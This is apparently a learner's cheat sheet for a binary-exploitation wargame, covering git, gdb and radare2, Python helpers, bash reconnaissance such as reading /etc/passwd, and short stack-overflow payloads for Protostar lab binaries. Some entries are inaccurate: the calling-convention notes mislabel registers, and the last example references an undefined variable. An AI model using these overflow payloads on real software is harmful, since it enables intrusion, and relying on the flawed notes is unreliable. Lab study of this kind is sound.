github notes -------------------------------------------

first time set up -------
git init
git add "file.c"
git commit -m "commit note or #"
git remote add origin https://github.com/USERNAME/repo.git
git push -u origin master

push updates (no tracking) ---------
git add "file.c"
git commit -m "update note"
git push -u origin master

github collaborate -------------------------------------
git remote -v 	#show remote details
git remote rm origin	#remove current origin

git pull #pull
git pull origin branchname
git clone https://github.com/user/project.git ~/dir/folder	#pull files to local folder

git user config ---------

git config --global user.email "myemail@email.com"
git config --global user.name "username"

x86-64 register information -----------------------

Intel - conventions

RAX - Function return values
RBX - Base pointer to data section
RCX - Counter for string and loop operations
RDX - I/O pointer
RBP - Stack Frame Base Pointer
RSI - Source pointer for string operations
RDI - Destination pointer for string operations
RSP - Stack pointer
RIP - Instruction pointer
R8-15 - General Purpose extra

Zero Flag (ZF) - set if the result of some instruction is zero, cleared otherwise
Sign Flag (SF) - Set equal to the most significant bit. THE SIGN bit of a signed integer (0 for postive, 1 for negative)

caller-save registers - RAX, RDX, RCX
callee-save registers - RBP, RBX, RSI, RDI

caller is in charge of saving the values before a call to a subroutine and restoring values after the call returns. Callee is highly likely to modify values in caller-save registers

callee must not modify registers which the caller didnt save unless the callee itself saves and restores the existing values

C Stuff --------------------------------------------
file.c
gcc -std=c99 file.c -o file
objdump
objdump -t file | grep func   (memory where function begins)
hexdump
strings
gdb
echo disassemble main | gdb license_fuzz > orig_gdb		#text file of output to review

General DEBUG info --------------------------------

add rax, 8 (this moves the register up 1 address in RAM)

radare2 | r2 ---------------------------------------
? (advanced help menu)
aaa
s sym.main (s for seek, use tab for reviewing options)
pdf
ood (enables debug mode on program, add inputs - ood parm1 parm2)
dc (runs program)
db 0x00400642 (memory location)
dr (review all registers at breakpoint)
dr rip=0x00400642 (set register to memory location)
VV (visual mode)
afvn old_var new_var (rename var's in visual mode)
p (in visual mode displays the memory address)
V! (opens fancy visual mode)

GDB -------------------------------------------------------------

gdb ./file1

set disassembly-flavor intel
x       (examine --- x win #examine win function)
p       (print ------p win #print win function)
x/s $esp  (examine string in ESP)
x/1i $eip (examine 1 next instruction in EIP)
x/8wx $esp (examine 8 words from stack ESP)
info b  (show all break points)

break *main
run | r
disassemble main
info proc mappings    (mapped addressed in ram)
x/wx $esp             (WORD value in register)
del                   (delete breakpoints)
break *0x0804840c
define hook-stop
info registers
x/24wx $esp           (examine 24 words in STACK)
x/2i $eip             (examine 2 instructions in EIP)
end

Python notes ---------------------------------------------------------------------------------

List tricks -------
a[start:end]	(items start through end -1)
a[start:]	(items start through the rest of the array)
a[:end]		(items from the beginning through end-1)
a[:]		(copy of whole list)

a[start:end:step]	(start thru end by step)

python -c 'print "A"*(4+16*3+14)' | /opt/protostar/bin/stack0

bash system calls in python ------------------------------------------------------------
import os
os.system("cp file1.c file2.c) #works with c executables as well

with open("file", "rb") as old_f, open("file2", "wb") as new_f:
	file2.write(function(old_f.read()))

python BINARY | Decimal | HEX -------------------------------------------
int('1111', 2)
for i in ["00000000", "00011000"]:
  print "{0} | {1:3} | {2:2x}".format(i, int(i,2), int(i,2))

bin(123) - '0b11111011'
hex(123) - '0x7b'
int('0b11111011', 2) - 123
hex(int('0b11111011', 2)) - '0x7b'
"\x41\xffABCD" - 'A\xffABCD'
"\x41\xffABCD".encode('hex') - '41ff41424344'

import struct
struct.unpack("I", "ABCD") - (1145258561,)
struct.unpack("I", "ABCD")[0] - 1145258561
hex(struct.unpack("I", "ABCD")[0] - '0x44434241' - little endian DCBA
hex(struct.unpack(">I", "ABCD")[0] - '0x41424344' - big endian ABCD

struct.pack("I", 0x41500000)

General Notes ---------------------------------------------------------------------------------------

bash -------------------------
(./Cprog1 ; ./Cprog2 parm1) > 2outputs.txt
echo $SHELL
bash -i
uname -a  (print system information)
file stack0 (info about file)
cat /etc/passwd   (all users set up on system - UID)
ps aux    (review all running processes with PID and UID)
whereis   (find file or script)
id        (user id's and groups)

r-x:  read + execute
rw-:  read + write
rwx:  read + write + execute
rws:  run in security mode

owner group user
-rws | r-x | r-x:


tmp scripts -----
cd /tmp
vim stack.py
python stack.py > exp
(gdb) r < /tmp/exp

python overflow example

padding = "AAAABBBBCCCCDDDD"
padding += "\x24\x84\x04\x08"   #0x08048424    #little endian


example2 --------------------------------------------

import struct
padding = "AAAABBBBCCCCDDDDEEEE"
edp = "AAAA"
eip = struct.pack("I", 0x080483f4)
print padding+edbp+eip
